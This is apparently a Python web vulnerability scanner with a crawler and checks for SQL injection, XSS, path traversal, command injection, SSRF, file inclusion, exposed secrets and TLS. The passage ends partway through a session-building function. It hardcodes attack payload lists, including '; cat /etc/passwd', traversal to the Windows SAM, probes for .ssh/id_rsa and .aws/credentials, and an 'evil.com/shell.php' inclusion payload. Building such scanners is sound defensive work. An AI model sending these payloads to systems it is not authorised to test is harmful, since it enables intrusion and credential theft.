"""
Comprehensive Security Scanner Engine
Implements all vulnerability tests similar to SmartScanner
"""
import json
import time
import re
import random
import string
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from html.parser import HTMLParser as BaseHTMLParser
import requests
from requests.adapters import HTTPAdapter
from requests.auth import HTTPBasicAuth
try:
    from urllib3.util.retry import Retry
except ImportError:
    class Retry:
        def __init__(self, *args, **kwargs):
            pass

class SimpleHTMLParser(BaseHTMLParser):
    """Simple HTML parser to extract links and forms"""
    def __init__(self):
        super().__init__()
        self.links = []
        self.forms = []
        self.current_form = None
        
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'a' and 'href' in attrs_dict:
            self.links.append(attrs_dict['href'])
        elif tag == 'form':
            self.current_form = {'action': attrs_dict.get('action', ''), 'method': attrs_dict.get('method', 'GET').upper(), 'inputs': []}
        elif tag == 'input' and self.current_form is not None:
            input_data = {'name': attrs_dict.get('name', ''), 'type': attrs_dict.get('type', 'text'), 'value': attrs_dict.get('value', '')}
            self.current_form['inputs'].append(input_data)
            
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None


class WebCrawler:
    """Web crawler/spider for discovering URLs"""
    def __init__(self, base_url, settings, session, issue_callback, progress_callback, status_callback):
        self.base_url = base_url
        self.settings = settings
        self.session = session
        self.issue_callback = issue_callback
        self.progress_callback = progress_callback
        self.status_callback = status_callback
        
        crawler_settings = settings.get("crawler", {})
        self.max_depth = crawler_settings.get("max_depth", 5) if crawler_settings.get("max_depth_enabled", True) else 999
        self.max_count = crawler_settings.get("max_count", 70000) if crawler_settings.get("max_count_enabled", True) else 999999
        self.file_exclusion = crawler_settings.get("file_exclusion", "").split(",") if crawler_settings.get("file_exclusion_enabled", True) else []
        self.url_exclusion = crawler_settings.get("url_exclusion", "").split("\n") if crawler_settings.get("url_exclusion", "") else []
        self.scan_subdomain = crawler_settings.get("scan_subdomain", False)
        self.scan_target_url = crawler_settings.get("scan_target_url", False)
        self.scope = crawler_settings.get("scope", "Smart")
        self.scope_regex = crawler_settings.get("scope_regex", "")
        
        self.visited_urls = set()
        self.urls_to_visit = [(base_url, 0)]  # (url, depth)
        self.discovered_urls = []
        self.discovered_forms = []
        self.base_domain = urlparse(base_url).netloc
        
    def should_exclude_url(self, url):
        """Check if URL should be excluded"""
        parsed = urlparse(url)
        path = parsed.path.lower()
        
        # Check file exclusion
        for ext in self.file_exclusion:
            ext = ext.strip().strip("*.")
            if path.endswith(f".{ext}"):
                return True
        
        # Check URL exclusion patterns
        for pattern in self.url_exclusion:
            pattern = pattern.strip()
            if pattern and pattern in url:
                return True
        
        # Check scope
        if self.scope == "Smart":
            if not self.scan_subdomain and parsed.netloc != self.base_domain:
                return True
        elif self.scope == "Manual" and self.scope_regex:
            if not re.search(self.scope_regex, url):
                return True
        
        return False
    
    def normalize_url(self, url):
        """Normalize URL"""
        parsed = urlparse(url)
        # Remove fragment
        normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if parsed.query:
            normalized += f"?{parsed.query}"
        return normalized
    
    def crawl(self):
        """Start crawling"""
        while self.urls_to_visit and len(self.discovered_urls) < self.max_count:
            if not self.urls_to_visit:
                break
                
            url, depth = self.urls_to_visit.pop(0)
            normalized_url = self.normalize_url(url)
            
            if normalized_url in self.visited_urls:
                continue
            
            if depth > self.max_depth:
                continue
            
            if self.should_exclude_url(normalized_url):
                continue
            
            self.visited_urls.add(normalized_url)
            self.discovered_urls.append(normalized_url)
            
            try:
                self.status_callback(f"Crawling: {normalized_url}")
                response = self.session.get(normalized_url, timeout=self.settings.get("http", {}).get("timeout", 60), allow_redirects=True)
                
                if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
                    # Parse HTML for links
                    parser = SimpleHTMLParser()
                    parser.feed(response.text)
                    
                    # Add discovered links
                    for link in parser.links:
                        absolute_url = urljoin(normalized_url, link)
                        parsed_link = urlparse(absolute_url)
                        
                        if parsed_link.netloc == self.base_domain or (self.scan_subdomain and parsed_link.netloc.endswith(self.base_domain.split('.', 1)[-1])):
                            if absolute_url not in self.visited_urls and depth < self.max_depth:
                                self.urls_to_visit.append((absolute_url, depth + 1))

                    # Capture discovered forms with absolute action URLs
                    for form in parser.forms:
                        action = form.get('action') or normalized_url
                        form['action'] = urljoin(normalized_url, action)
                        self.discovered_forms.append(form)
                
            except Exception as e:
                pass  # Continue crawling
        
        return self.discovered_urls


class VulnerabilityScanner:
    """Comprehensive vulnerability scanner"""
    
    def __init__(self, settings, session, issue_callback, progress_callback, status_callback):
        self.settings = settings
        self.session = session
        self.issue_callback = issue_callback
        self.progress_callback = progress_callback
        self.status_callback = status_callback
        
        # Load test profile
        test_profiles = settings.get("test_profiles", {})
        current_profile = test_profiles.get("_current_profile", "Default")
        self.test_profile = test_profiles.get(current_profile, {})
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1--",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "1' OR '1'='1' #",
            "' OR 'x'='x",
            "' OR 1=1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('x'='x",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND 1=1",
            "1' AND 1=2",
            "1' OR '1'='1",
            "1' OR '1'='2",
            "1' OR 1=1",
            "1' OR 1=2",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]
        
        # Path Traversal payloads
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....%2F....%2F....%2Fetc%2Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        ]
        
        # Command Injection payloads
        self.command_injection_payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
        ]
    
    def test_sql_injection(self, url, params=None, method="GET"):
        """Test for SQL Injection vulnerabilities"""
        if not self.test_profile.get("checkTestSQLInjection", True):
            return []
        
        issues = []
        test_params = params or {}
        
        for payload in self.sql_payloads[:10]:  # Limit to first 10 for performance
            try:
                test_params_copy = test_params.copy()
                # Inject payload into each parameter
                for param_name in test_params_copy.keys():
                    test_params_copy[param_name] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params_copy, timeout=30)
                    else:
                        response = self.session.post(url, data=test_params_copy, timeout=30)
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*\Wmysql_",
                        r"MySQLSyntaxErrorException",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*\Wpg_",
                        r"valid PostgreSQL result",
                        r"Npgsql\.",
                        r"Driver.*SQL.*Server",
                        r"OLE DB.*SQL Server",
                        r"(\W|\A)SQL Server.*Driver",
                        r"Warning.*\Wmssql_",
                        r"Warning.*\Wodbc_",
                        r"Warning.*\Woci_",
                        r"Warning.*\Wora_",
                        r"Oracle error",
                        r"Oracle.*Driver",
                        r"Warning.*\Wifx_",
                        r"Exception.*Informix",
                        r"Warning.*\Wingres_",
                        r"Warning.*\Wibase_",
                        r"SQLSTATE.*SQL syntax",
                        r"Microsoft Access.*Driver",
                        r"JET Database Engine",
                        r"Access.*Database Engine",
                        r"SQLException",
                        r"SQLite.*error",
                        r"SQLite.*Exception",
                        r"Warning.*\Wsqlite_",
                        r"Warning.*\WSQLite3::",
                        r"SQLite3::query\(\)",
                        r"SQL syntax error",
                        r"quoted string not properly terminated",
                    ]
                    
                    response_text = response.text.lower()
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            issues.append({
                                "title": "SQL Injection",
                                "severity": "High",
                                "url": response.url,
                                "description": f"SQL Injection vulnerability detected. The application appears to be vulnerable to SQL injection attacks. Parameter '{param_name}' with payload '{payload}' triggered a database error.",
                                "request": f"{method} {url}\nParameter: {param_name}={payload}",
                                "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                            })
                            break
                    
                    if issues:
                        break
                        
            except Exception:
                pass
        
        return issues
    
    def test_blind_sql_injection(self, url, params=None, method="GET"):
        """Test for Blind SQL Injection"""
        if not self.test_profile.get("checkTestBlindSQLInjection", True):
            return []
        
        issues = []
        # Simplified blind SQL test - check for time delays
        time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
        ]
        
        for payload in time_based_payloads:
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    start_time = time.time()
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=10)
                    else:
                        response = self.session.post(url, data=test_params, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 4:  # Significant delay detected
                        issues.append({
                            "title": "Blind SQL Injection",
                            "severity": "High",
                            "url": response.url,
                            "description": f"Blind SQL Injection vulnerability detected. Time-based SQL injection test caused a {elapsed:.2f} second delay, indicating the application may be vulnerable.",
                            "request": f"{method} {url}\nPayload: {payload}",
                            "response": f"HTTP/1.1 {response.status_code}\nDelay: {elapsed:.2f}s"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_xss(self, url, params=None, method="GET"):
        """Test for Cross-Site Scripting (XSS)"""
        if not self.test_profile.get("checkTestCrossSiteScripting", True):
            return []
        
        issues = []
        
        for payload in self.xss_payloads[:5]:  # Limit for performance
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=30)
                    else:
                        response = self.session.post(url, data=test_params, timeout=30)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        issues.append({
                            "title": "Cross-Site Scripting (XSS)",
                            "severity": "High",
                            "url": response.url,
                            "description": f"Cross-Site Scripting vulnerability detected. The application reflects user input without proper sanitization. Payload '{payload}' was reflected in the response.",
                            "request": f"{method} {url}\nParameter: {first_param}={payload}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_path_traversal(self, url, params=None, method="GET"):
        """Test for Path Traversal vulnerabilities"""
        if not self.test_profile.get("checkTestPathTraversal", True):
            return []
        
        issues = []
        
        for payload in self.path_traversal_payloads[:5]:
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=30)
                    else:
                        response = self.session.post(url, data=test_params, timeout=30)
                    
                    # Check for common file contents
                    if "root:" in response.text or "[boot loader]" in response.text.lower() or "bin/bash" in response.text:
                        issues.append({
                            "title": "Path Traversal",
                            "severity": "High",
                            "url": response.url,
                            "description": f"Path Traversal vulnerability detected. The application allows reading files outside the web root directory.",
                            "request": f"{method} {url}\nParameter: {first_param}={payload}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_command_injection(self, url, params=None, method="GET"):
        """Test for OS Command Execution"""
        if not self.test_profile.get("checkTestOSCommandExecution", True):
            return []
        
        issues = []
        
        for payload in self.command_injection_payloads[:5]:
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=30)
                    else:
                        response = self.session.post(url, data=test_params, timeout=30)
                    
                    # Check for command output patterns
                    if "uid=" in response.text or "gid=" in response.text or "total " in response.text.lower():
                        issues.append({
                            "title": "OS Command Execution",
                            "severity": "High",
                            "url": response.url,
                            "description": f"OS Command Execution vulnerability detected. The application appears to execute system commands based on user input.",
                            "request": f"{method} {url}\nParameter: {first_param}={payload}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_open_redirect(self, url, params=None, method="GET"):
        """Test for Unvalidated Redirections"""
        if not self.test_profile.get("checkTestUnvalidatedRedirections", True):
            return []
        
        issues = []
        redirect_params = ["redirect", "url", "next", "return", "goto", "target", "destination"]
        
        for param_name in redirect_params:
            try:
                test_params = params.copy() if params else {}
                test_url = "http://evil.com"
                test_params[param_name] = test_url
                
                if method.upper() == "GET":
                    response = self.session.get(url, params=test_params, timeout=30, allow_redirects=False)
                else:
                    response = self.session.post(url, data=test_params, timeout=30, allow_redirects=False)
                
                # Check if redirects to our test URL
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get("Location", "")
                    if test_url in location:
                        issues.append({
                            "title": "Unvalidated Redirections",
                            "severity": "Medium",
                            "url": response.url,
                            "description": f"Unvalidated redirect vulnerability detected. Parameter '{param_name}' allows redirecting to arbitrary URLs without validation.",
                            "request": f"{method} {url}\nParameter: {param_name}={test_url}",
                            "response": f"HTTP/1.1 {response.status_code}\nLocation: {location}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_sensitive_data_disclosure(self, url):
        """Test for Sensitive Data Disclosure"""
        if not self.test_profile.get("checkTestSensitiveDataDisclosure", True):
            return []
        
        issues = []
        sensitive_paths = [
            "/.env", "/.git/config", "/.svn/entries", "/.DS_Store",
            "/config.php", "/config.inc.php", "/wp-config.php",
            "/web.config", "/.htaccess", "/backup.sql", "/dump.sql",
            "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/id_dsa"
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in sensitive_paths:
            try:
                test_url = base_url + path
                response = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                if response.status_code == 200:
                    # Check for sensitive content
                    content_lower = response.text.lower()
                    if "password" in content_lower or "secret" in content_lower or "api_key" in content_lower or "database" in content_lower:
                        issues.append({
                            "title": "Sensitive Data Disclosure",
                            "severity": "High",
                            "url": test_url,
                            "description": f"Sensitive file found: {path}. This file may contain sensitive information such as credentials, API keys, or database configuration.",
                            "request": f"GET {test_url}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
            except Exception:
                pass
        
        return issues
    
    def test_directory_listing(self, url):
        """Test for Directory Listing"""
        if not self.test_profile.get("checkTestDirectoryListing", True):
            return []
        
        issues = []
        test_dirs = ["/images/", "/files/", "/uploads/", "/assets/", "/static/", "/media/"]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for dir_path in test_dirs:
            try:
                test_url = base_url + dir_path
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    # Check for directory listing indicators
                    if "<title>Index of" in response.text or "<h1>Index of" in response.text or "Directory listing" in response.text.lower():
                        issues.append({
                            "title": "Directory Listing",
                            "severity": "Medium",
                            "url": test_url,
                            "description": f"Directory listing is enabled for {dir_path}. This exposes the directory structure and file names to attackers.",
                            "request": f"GET {test_url}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
            except Exception:
                pass
        
        return issues
    
    def test_robots_txt(self, url):
        """Test for robots.txt"""
        if not self.test_profile.get("checkTestTestforRobots", True):
            return []
        
        issues = []
        parsed = urlparse(url)
        robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
        
        try:
            response = self.session.get(robots_url, timeout=10)
            if response.status_code == 200:
                issues.append({
                    "title": "Robots.txt Found",
                    "severity": "Info",
                    "url": robots_url,
                    "description": "robots.txt file is accessible and may reveal directory structure or sensitive paths.",
                    "request": f"GET {robots_url}",
                    "response": response.text[:500]
                })
        except Exception:
            pass
        
        return issues
    
    def test_sitemap(self, url):
        """Test for sitemap.xml"""
        if not self.test_profile.get("checkTestCheckSitemap", True):
            return []
        
        issues = []
        parsed = urlparse(url)
        sitemap_url = f"{parsed.scheme}://{parsed.netloc}/sitemap.xml"
        
        try:
            response = self.session.get(sitemap_url, timeout=10)
            if response.status_code == 200:
                issues.append({
                    "title": "Sitemap Found",
                    "severity": "Info",
                    "url": sitemap_url,
                    "description": "sitemap.xml file is accessible and may reveal application structure.",
                    "request": f"GET {sitemap_url}",
                    "response": response.text[:500]
                })
        except Exception:
            pass
        
        return issues
    
    def test_web_server_info(self, url):
        """Test for web server information disclosure"""
        issues = []
        
        try:
            response = self.session.get(url, timeout=10)
            server = response.headers.get("Server", "")
            
            if server:
                # Check for Nginx
                if self.test_profile.get("checkTestNginx", True) and "nginx" in server.lower():
                    if "/" in server:
                        version = server.split("/")[-1].split()[0]
                        try:
                            major, minor = map(int, version.split(".")[:2])
                            if major == 1 and minor < 25:
                                issues.append({
                                    "title": "Vulnerable Nginx Version",
                                    "severity": "Medium",
                                    "url": url,
                                    "description": f"The Nginx version used ({version}) is outdated and may have security flaws.",
                                    "request": f"GET {url}",
                                    "response": f"HTTP/1.1 {response.status_code}\nServer: {server}"
                                })
                            else:
                                issues.append({
                                    "title": "Nginx Version Disclosure",
                                    "severity": "Low",
                                    "url": url,
                                    "description": f"Nginx version {version} is disclosed in Server header.",
                                    "request": f"GET {url}",
                                    "response": f"Server: {server}"
                                })
                        except:
                            issues.append({
                                "title": "Nginx Version Disclosure",
                                "severity": "Low",
                                "url": url,
                                "description": f"Nginx version information is disclosed: {server}",
                                "request": f"GET {url}",
                                "response": f"Server: {server}"
                            })
                
                # Check for Apache
                if self.test_profile.get("checkTestApacheHTTPD", True) and "apache" in server.lower():
                    issues.append({
                        "title": "Apache Version Disclosure",
                        "severity": "Low",
                        "url": url,
                        "description": f"Apache version information is disclosed: {server}",
                        "request": f"GET {url}",
                        "response": f"Server: {server}"
                    })
                
                # Check for IIS
                if self.test_profile.get("checkTestMicrosoftIIS", True) and "iis" in server.lower():
                    issues.append({
                        "title": "Microsoft IIS Version Disclosure",
                        "severity": "Low",
                        "url": url,
                        "description": f"Microsoft IIS version information is disclosed: {server}",
                        "request": f"GET {url}",
                        "response": f"Server: {server}"
                    })
        except Exception:
            pass
        
        return issues
    
    def test_security_headers(self, url):
        """Test HTTP security headers"""
        if not self.test_profile.get("checkTestHTTPHeaderSecurity", True):
            return []
        
        issues = []
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Check for missing security headers
            missing_headers = []
            if "X-Content-Type-Options" not in response.headers:
                missing_headers.append("X-Content-Type-Options")
            if "X-Frame-Options" not in response.headers:
                missing_headers.append("X-Frame-Options")
            if "X-XSS-Protection" not in response.headers:
                missing_headers.append("X-XSS-Protection")
            if "Strict-Transport-Security" not in response.headers and urlparse(url).scheme == "https":
                missing_headers.append("Strict-Transport-Security")
            if "Content-Security-Policy" not in response.headers:
                missing_headers.append("Content-Security-Policy")
            
            if missing_headers:
                issues.append({
                    "title": "Missing Security Headers",
                    "severity": "Medium",
                    "url": url,
                    "description": f"Missing recommended security headers: {', '.join(missing_headers)}",
                    "request": f"GET {url}",
                    "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}"
                })
            
            # Check for information disclosure headers
            if "X-Powered-By" in response.headers:
                issues.append({
                    "title": "X-Powered-By Header Found",
                    "severity": "Low",
                    "url": url,
                    "description": f"X-Powered-By header reveals technology stack: {response.headers['X-Powered-By']}",
                    "request": f"GET {url}",
                    "response": f"X-Powered-By: {response.headers['X-Powered-By']}"
                })
        except Exception:
            pass
        
        return issues
    
    def test_cms_detection(self, url):
        """Test for CMS detection (WordPress, Drupal, Joomla)"""
        issues = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # WordPress detection
        if self.test_profile.get("checkTestWordPress", True):
            wp_paths = ["/wp-admin/", "/wp-content/", "/wp-includes/", "/wp-login.php"]
            for path in wp_paths:
                try:
                    test_url = base_url + path
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200 and ("wp-content" in response.text.lower() or "wordpress" in response.text.lower()):
                        issues.append({
                            "title": "WordPress Detected",
                            "severity": "Info",
                            "url": test_url,
                            "description": "WordPress CMS detected. Consider checking for WordPress-specific vulnerabilities.",
                            "request": f"GET {test_url}",
                            "response": f"HTTP/1.1 {response.status_code}"
                        })
                        break
                except Exception:
                    pass
        
        # Drupal detection
        if self.test_profile.get("checkTestDrupal", True):
            drupal_paths = ["/sites/default/", "/modules/", "/themes/", "/CHANGELOG.txt"]
            for path in drupal_paths:
                try:
                    test_url = base_url + path
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200 and "drupal" in response.text.lower():
                        issues.append({
                            "title": "Drupal Detected",
                            "severity": "Info",
                            "url": test_url,
                            "description": "Drupal CMS detected. Consider checking for Drupal-specific vulnerabilities.",
                            "request": f"GET {test_url}",
                            "response": f"HTTP/1.1 {response.status_code}"
                        })
                        break
                except Exception:
                    pass
        
        # Joomla detection
        if self.test_profile.get("checkTestJoomla", True):
            joomla_paths = ["/administrator/", "/components/", "/modules/", "/templates/"]
            for path in joomla_paths:
                try:
                    test_url = base_url + path
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200 and "joomla" in response.text.lower():
                        issues.append({
                            "title": "Joomla Detected",
                            "severity": "Info",
                            "url": test_url,
                            "description": "Joomla CMS detected. Consider checking for Joomla-specific vulnerabilities.",
                            "request": f"GET {test_url}",
                            "response": f"HTTP/1.1 {response.status_code}"
                        })
                        break
                except Exception:
                    pass
        
        return issues
    
    def test_ssrf(self, url, params=None, method="GET"):
        """Test for Server-Side Request Forgery (SSRF)"""
        if not self.test_profile.get("checkTestServerSideRequestForgery", True):
            return []
        
        issues = []
        # Test with internal IP addresses
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",  # AWS metadata
            "http://192.168.1.1",
            "file:///etc/passwd",
        ]
        
        for payload in ssrf_payloads[:3]:  # Limit for performance
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=10)
                    else:
                        response = self.session.post(url, data=test_params, timeout=10)
                    
                    # Check if internal content is reflected
                    if "127.0.0.1" in response.text or "localhost" in response.text.lower() or "root:" in response.text:
                        issues.append({
                            "title": "Server-Side Request Forgery (SSRF)",
                            "severity": "High",
                            "url": response.url,
                            "description": f"SSRF vulnerability detected. The application appears to make requests to internal resources based on user input.",
                            "request": f"{method} {url}\nParameter: {first_param}={payload}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_file_inclusion(self, url, params=None, method="GET"):
        """Test for Local/Remote File Inclusion"""
        if not (self.test_profile.get("checkTestLocalFileInclusion", True) or 
                self.test_profile.get("checkTestRemoteFileInclusion", True)):
            return []
        
        issues = []
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.php",
            "http://127.0.0.1/test.php",
        ]
        
        all_payloads = []
        if self.test_profile.get("checkTestLocalFileInclusion", True):
            all_payloads.extend(lfi_payloads)
        if self.test_profile.get("checkTestRemoteFileInclusion", True):
            all_payloads.extend(rfi_payloads)
        
        for payload in all_payloads[:3]:
            try:
                test_params = params.copy() if params else {}
                if test_params:
                    first_param = list(test_params.keys())[0]
                    test_params[first_param] = payload
                    
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_params, timeout=10)
                    else:
                        response = self.session.post(url, data=test_params, timeout=10)
                    
                    # Check for file inclusion indicators
                    if "root:" in response.text or "[boot loader]" in response.text.lower() or "<?php" in response.text.lower():
                        vuln_type = "Local File Inclusion" if payload.startswith("..") else "Remote File Inclusion"
                        issues.append({
                            "title": vuln_type,
                            "severity": "High",
                            "url": response.url,
                            "description": f"{vuln_type} vulnerability detected. The application includes files based on user input without proper validation.",
                            "request": f"{method} {url}\nParameter: {first_param}={payload}",
                            "response": f"HTTP/1.1 {response.status_code}\n{self._format_headers(response.headers)}\n\n{response.text[:500]}"
                        })
                        break
            except Exception:
                pass
        
        return issues
    
    def test_ssl_tls(self, url):
        """Test SSL/TLS configuration"""
        if not self.test_profile.get("checkTestSSLTLS", True):
            return []
        
        issues = []
        parsed = urlparse(url)
        
        if parsed.scheme != "https":
            return issues
        
        try:
            import ssl
            import socket
            
            hostname = parsed.netloc.split(':')[0]
            port = parsed.port if parsed.port else 443
            
            # Test SSL/TLS version
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    protocol = ssock.version()
                    
                    if protocol in ["TLSv1", "TLSv1.1", "SSLv2", "SSLv3"]:
                        issues.append({
                            "title": "Weak SSL/TLS Protocol",
                            "severity": "Medium",
                            "url": url,
                            "description": f"Server uses weak SSL/TLS protocol: {protocol}. This protocol may be vulnerable to attacks like POODLE, BEAST, etc.",
                            "request": f"GET {url}",
                            "response": f"SSL/TLS Protocol: {protocol}"
                        })
                    
                    # Check certificate
                    cert = ssock.getpeercert()
                    if cert:
                        # Check for self-signed certificate
                        issuer = dict(x[0] for x in cert.get('issuer', []))
                        subject = dict(x[0] for x in cert.get('subject', []))
                        
                        if issuer.get('commonName') == subject.get('commonName'):
                            issues.append({
                                "title": "Self-Signed SSL Certificate",
                                "severity": "Medium",
                                "url": url,
                                "description": "Server uses a self-signed SSL certificate. This may indicate a man-in-the-middle attack risk.",
                                "request": f"GET {url}",
                                "response": "Self-signed certificate detected"
                            })
        except Exception:
            pass
        
        return issues
    
    def test_brute_force(self, url):
        """Test for brute force vulnerabilities (simplified)"""
        if not self.test_profile.get("checkTestBruteForce", True):
            return []
        
        issues = []
        # Check for login pages without rate limiting
        login_paths = ["/login", "/admin", "/wp-login.php", "/administrator"]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in login_paths:
            try:
                test_url = base_url + path
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and ("password" in response.text.lower() or "login" in response.text.lower()):
                    # Check if there's rate limiting (simplified check)
                    # In a real implementation, you'd test multiple requests
                    issues.append({
                        "title": "Login Page Found",
                        "severity": "Info",
                        "url": test_url,
                        "description": f"Login page found at {path}. Consider testing for brute force protection and account lockout mechanisms.",
                        "request": f"GET {test_url}",
                        "response": f"HTTP/1.1 {response.status_code}"
                    })
                    break
            except Exception:
                pass
        
        return issues
    
    def _format_headers(self, headers):
        """Format response headers"""
        return "\n".join([f"{k}: {v}" for k, v in headers.items()])


def _build_session(settings):
    session = requests.Session()
    http_settings = settings.get("http", {})
    retries = Retry(total=2, backoff_factor=0.2, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    if http_settings.get("user_agent"):
        session.headers["User-Agent"] = http_settings.get("user_agent")
    if http_settings.get("additional_http"):
        for line in http_settings.get("additional_http", "").splitlines():
            if ":" in line:
                key, value = line.split(":", 1)
                session.headers[key.strip()] = value.strip()

    proxy_settings = settings.get("proxy", {})
    if proxy_settings.get("type") in {"http", "socks"} and proxy_settings.get("ip"):
        scheme = "socks5" if proxy_settings.get("type") == "socks" else "http"
        auth = ""
        if proxy_settings.get("username"):
            auth = f"{proxy_settings.get('username')}:{proxy_settings.get('password', '')}@"
        proxy_url = f"{scheme}://{auth}{proxy_settings.get('ip')}:{proxy_settings.get('port', 8080)}"
        session.proxies.update({"http": proxy_url, "https": proxy_url})

    auth_settings = settings.get("authentication", {})
